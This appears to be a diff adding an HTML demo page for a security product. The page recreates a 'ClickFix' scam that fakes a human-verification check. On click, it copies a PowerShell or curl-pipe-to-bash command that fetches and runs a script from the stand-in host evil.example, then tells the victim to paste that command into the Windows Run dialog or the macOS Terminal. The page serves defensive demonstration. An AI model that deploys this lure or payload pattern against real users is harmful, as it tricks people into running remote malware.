@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="en">
+<!--
+  Scouter — ClickFix DEMO lure (inert).
+  A realistic re-creation of the "verify you are human" ClickFix scam, for demoing and screenshotting
+  Scouter Web Guard catching it. The command it copies points at evil.example and does NOTHING.
+  It evokes the ClickFix pattern without copying any real company's logo or trademark. Local file only.
+-->
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Just a moment…</title>
+<style>
+  :root{
+    --bg:#f3f4f6; --card:#ffffff; --ink:#1f2430; --muted:#6b7280; --line:#e5e7eb;
+    --accent:#f38020; --accent-ink:#9a4a00; --blue:#2f6fed; --ok:#2fa84f;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;background:
+      radial-gradient(1200px 600px at 50% -10%, #ffffff 0%, var(--bg) 60%);
+    color:var(--ink);
+    font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;
+  }
+  .wrap{width:100%;max-width:600px;text-align:center}
+  .host{font-size:26px;font-weight:600;letter-spacing:-.01em;margin:0 0 4px}
+  .host .path{color:var(--muted);font-weight:400}
+  .sub{color:var(--muted);margin:0 0 28px}
+  .card{
+    background:var(--card);border:1px solid var(--line);border-radius:14px;
+    box-shadow:0 1px 2px rgba(16,24,40,.04),0 12px 32px rgba(16,24,40,.06);
+    padding:26px 26px 22px;text-align:left;
+  }
+  /* turnstile-style check widget (generic, not a real brand mark) */
+  .tw{display:flex;align-items:center;gap:14px;border:1px solid var(--line);border-radius:10px;
+      padding:14px 16px;background:#fbfbfc}
+  .tw .box{width:26px;height:26px;border:2px solid #c6ccd6;border-radius:6px;flex:0 0 auto;
+      display:flex;align-items:center;justify-content:center;background:#fff;transition:.2s}
+  .tw.checking .box{border-color:var(--blue)}
+  .tw.done .box{border-color:var(--ok);background:var(--ok)}
+  .spin{width:18px;height:18px;border:2.5px solid #d7dce5;border-top-color:var(--blue);
+      border-radius:50%;animation:sp .7s linear infinite;display:none}
+  .tw.checking .spin{display:block}
+  .tw.checking .box{display:none}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .chk{display:none}
+  .tw.done .chk{display:block}
+  .tw .lbl{font-weight:500}
+  .tw .brand{margin-left:auto;text-align:right;color:var(--muted);font-size:11px;line-height:1.3}
+  .tw .brand .b1{display:flex;align-items:center;gap:6px;justify-content:flex-end;font-weight:600;color:#9aa1ad}
+  .tw .brand .shield{width:14px;height:14px}
+  .steps{display:none;margin-top:18px;border:1px solid #f1d9bf;background:#fff8f0;border-radius:10px;padding:16px 18px}
+  .steps.show{display:block;animation:fade .25s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+  .steps h3{margin:0 0 4px;font-size:15px;color:var(--accent-ink);display:flex;align-items:center;gap:8px}
+  .steps p{margin:0 0 12px;color:#7a5326;font-size:13px}
+  ol{margin:0;padding-left:20px}
+  li{margin:7px 0;font-size:14px}
+  kbd{font:12px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:#fff;border:1px solid #d9c3a6;
+      border-bottom-width:2px;border-radius:5px;padding:2px 7px;color:#5b3d17;white-space:nowrap}
+  .ref{color:var(--muted);font-size:11.5px;margin:22px 2px 0;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+  .ostog{display:inline-flex;border:1px solid var(--line);border-radius:999px;overflow:hidden;font-size:12px}
+  .ostog button{border:0;background:#fff;color:var(--muted);padding:5px 12px;cursor:pointer;font:inherit}
+  .ostog button.on{background:var(--ink);color:#fff}
+  .demo{margin-top:14px;text-align:center;color:#aab0ba;font-size:10.5px;letter-spacing:.03em}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="host">secure-login<span class="path">.example.com</span></div>
+    <p class="sub">Checking your browser before you continue.</p>
+
+    <div class="card">
+      <div class="tw" id="tw" role="button" tabindex="0" aria-label="Verify you are human">
+        <div class="box">
+          <svg class="chk" width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <div class="spin"></div>
+        <div class="lbl" id="lbl">Verify you are human</div>
+        <div class="brand">
+          <div class="b1">
+            <svg class="shield" viewBox="0 0 24 24" fill="none"><path d="M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5l8-3z" stroke="#b7bdc8" stroke-width="1.6" stroke-linejoin="round"/></svg>
+            VERIFIED
+          </div>
+          <div>Security check</div>
+        </div>
+      </div>
+
+      <div class="steps" id="steps">
+        <h3>⚠ One more step — manual verification required</h3>
+        <p>Automatic verification failed. Complete these steps to confirm you are human:</p>
+        <ol id="oswin">
+          <li>Press <kbd>⊞ Win</kbd> + <kbd>R</kbd> to open the Run dialog.</li>
+          <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the verification code.</li>
+          <li>Press <kbd>Enter</kbd> to finish.</li>
+        </ol>
+        <ol id="osmac" style="display:none">
+          <li>Open <b>Terminal</b> (press <kbd>⌘</kbd> + <kbd>Space</kbd>, type <kbd>Terminal</kbd>, Enter).</li>
+          <li>Press <kbd>⌘</kbd> + <kbd>V</kbd> to paste the verification code.</li>
+          <li>Press <kbd>Return</kbd> to finish.</li>
+        </ol>
+      </div>
+
+      <div class="ref">
+        <span>Ray ID: <b id="ray">—</b></span>
+        <span class="ostog">
+          <button id="tWin" class="on">Windows</button><button id="tMac">macOS</button>
+        </span>
+        <span>Performance &amp; security</span>
+      </div>
+    </div>
+
+    <div class="demo">SCOUTER CLICKFIX DEMO · PAYLOAD IS INERT (evil.example) · LOCAL FILE ONLY</div>
+  </div>
+
+<script>
+  var PAY = {
+    win: 'powershell -w hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(\'http://evil.example/verify.ps1\')"  # ✔ Verification ID: 7F3A-91C2',
+    mac: 'curl -fsSL http://evil.example/verify.sh | bash  # ✔ Verification ID: 7F3A-91C2'
+  };
+  var os = /Mac/i.test(navigator.platform) ? "mac" : "win";
+  function setOS(v){
+    os=v;
+    document.getElementById("oswin").style.display = v==="win"?"block":"none";
+    document.getElementById("osmac").style.display = v==="mac"?"block":"none";
+    document.getElementById("tWin").className = v==="win"?"on":"";
+    document.getElementById("tMac").className = v==="mac"?"on":"";
+  }
+  document.getElementById("tWin").onclick=function(){setOS("win")};
+  document.getElementById("tMac").onclick=function(){setOS("mac")};
+  setOS(os);
+  document.getElementById("ray").textContent =
+    Math.random().toString(16).slice(2,10)+"-"+Math.random().toString(16).slice(2,6);
+
+  var tw=document.getElementById("tw"), lbl=document.getElementById("lbl"), steps=document.getElementById("steps");
+  function go(){
+    if(tw.classList.contains("done")) return;
+    // Copy the (inert) "verification code" NOW, inside the click gesture — real ClickFix kits copy on
+    // the click, and doing it here keeps the transient user-activation the clipboard API requires.
+    try { if(navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(PAY[os]); } catch(e){}
+    tw.classList.add("checking"); lbl.textContent="Verifying…";
+    setTimeout(function(){
+      tw.classList.remove("checking"); tw.classList.add("done"); lbl.textContent="Verification required";
+      steps.classList.add("show");
+    }, 1100);
+  }
+  tw.addEventListener("click", go);
+  tw.addEventListener("keydown", function(e){ if(e.key==="Enter"||e.key===" ") go(); });
+</script>
+</body>
+</html>
